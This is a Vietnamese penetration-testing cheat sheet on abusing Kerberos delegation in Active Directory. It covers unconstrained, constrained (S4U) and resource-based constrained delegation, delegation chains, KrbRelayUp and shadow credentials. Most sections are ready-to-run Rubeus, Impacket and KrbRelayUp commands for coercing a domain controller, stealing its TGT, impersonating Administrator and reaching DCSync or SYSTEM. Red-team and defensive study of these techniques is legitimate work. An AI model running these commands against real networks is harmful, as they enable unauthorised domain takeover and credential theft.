# 05 — Kerberos Delegation

**Trạng thái:** có creds; phát hiện delegation qua `findDelegation.py` hoặc
BloodHound. **Mục tiêu:** mạo danh user đặc quyền (thường Administrator) → Admin
trên máy đích / DC. Nhánh "Kerberos Delegation" của mindmap.

```bash
findDelegation.py "<domain>"/"<user>":"<password>"     # liệt kê mọi loại delegation
```

Ba loại (mindmap tách rõ): **Unconstrained**, **Constrained**, **RBCD**.

---

## A. Unconstrained Delegation

> **Khi nào chạy:** có quyền admin trên máy bật unconstrained (UAC cờ
> `ADS_UF_TRUSTED_FOR_DELEGATION`).
> **Tại sao:** máy đó lưu **TGT của mọi user kết nối tới nó**; ép DC kết nối →
> lấy TGT của `DC01$` → DCSync.

```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c      # tìm (BloodHound)
MATCH (c:User {unconstraineddelegation:true}) RETURN c
```

```powershell
# Trên máy unconstrained (admin): bắt TGT bay vào
Rubeus.exe monitor /interval:5
Rubeus.exe dump /service:krbtgt /nowrap
Rubeus.exe dump /luid:0xdeadbeef /nowrap
# Ép DC kết nối (coerce — file 01 §G), rồi:
Rubeus.exe ptt /ticket:<base64_TGT_của_DC$>
```

- **Kết quả:** box **"Kerberos TGT"** của DC → **PassTheTicket** → DCSync → DA.
- **Force connection with coerce:** dùng `printerbug.py`/`petitpotam.py` ép
  `DC01$` xác thực tới máy unconstrained.

---

## B. Constrained Delegation (S4U)

> **Khi nào chạy:** có creds/hash của tài khoản được gán
> `msDS-AllowedToDelegateTo` (UAC `TRUSTED_TO_AUTH_FOR_DELEGATION`).
> **Tại sao:** `S4U2Self` + `S4U2Proxy` cho phép xin TGS mạo danh **bất kỳ user**
> tới service được uỷ quyền.

```cypher
MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p      # tìm
```

```powershell
# With protocol transition (any) — Windows/Rubeus
Rubeus.exe hash /password:<password>                                 # lấy rc4/aes của account
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES256 hash>
Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> \
   /msdsspn:<spn_constrained> /altservice:<altservice> /ptt         # altservice: HTTP/HOST/CIFS/LDAP
```

```bash
# Impacket (Linux)
getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' \
   '<domain>/<user>:<password>' -altservice <altservice>
```

- **Kết quả:** box **"Kerberos TGS"** mạo danh Administrator tới service đích →
  PtT → Admin.
- **Without protocol transition (kerberos only)** (UAC `TRUSTED_FOR_DELEGATION`):
  cần ticket có sẵn của user; kỹ thuật tương tự nhưng không tự S4U2Self với user tuỳ ý.

---

## C. Resource-Based Constrained Delegation (RBCD)

> **Khi nào chạy:** có quyền ghi `msDS-AllowedToActOnBehalfOfOtherIdentity` trên
> **máy đích** (GenericWrite/GenericAll trên object máy) **và** MachineAccountQuota>0.
> **Tại sao:** khai báo "máy của tôi được mạo danh tới máy đích" → S4U lấy ticket
> Administrator tới máy đích.

```bash
# 1) Thêm computer account (nếu MAQ>0)
addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' \
   -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'
# 2) Ghi RBCD trên máy đích
rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' \
   -action 'write' <domain>/<user>:<password>
# 3) S4U lấy ST mạo danh Administrator tới máy đích
getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' \
   -impersonate Administrator --dc-ip <dc_ip>
```

```powershell
# Windows/Rubeus
Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>
Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES256 hash> /impersonateuser:administrator \
   /msdsspn:cifs/<victim.domain.local> \
   /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

- **Kết quả:** box **"Kerberos TGS"** → PtT → **Admin** trên máy đích.
- **Self RBCD:** như RBCD nhưng không cần thêm computer (máy tự uỷ quyền cho chính nó).

---

## D. Constrained delegation chain (Y→Z) & Add RBCD

Mindmap mô tả chuỗi: *Constrain between Y and Z* → Add computer X → Add RBCD X→Y
→ S4U2Self X (impersonate admin) → S4U2Proxy X (admin trên spn/Y) → Forwardable
TGS for Y → S4U2Proxy Y (admin trên spn/Z). Dùng khi delegation bắc cầu qua
nhiều máy.

---

## E. KrbRelayUp (local privesc qua RBCD)

> **Khi nào chạy:** là user thường trên máy đã join domain, MAQ>0.
> **Tại sao:** relay LDAP kết hợp RBCD để lên SYSTEM local mà không cần creds admin.

```powershell
KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount \
   -ComputerName <computer$> -ComputerPassword <password>
KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>
```

- **Kết quả:** box **"Admin"** (SYSTEM local).

---

## F. Shadow Credentials (liên quan, khi có GenericWrite)

Xem [file 06 §Shadow](06-adcs.md) và [file 09](09-acl-ace-abuse.md): ghi
`msDS-KeyCredentialLink` → PKINIT lấy TGT/hash. Mindmap đặt cạnh delegation vì
cùng khai thác quyền ghi trên object máy/user.

---

## Checklist Delegation

- [ ] `findDelegation.py` liệt kê loại
- [ ] Unconstrained → monitor + coerce DC → TGT DC → DCSync
- [ ] Constrained → `getST -impersonate Administrator` (+ altservice trick)
- [ ] RBCD → addcomputer → rbcd write → getST → Admin
- [ ] MAQ>0? kiểm tra trước khi RBCD
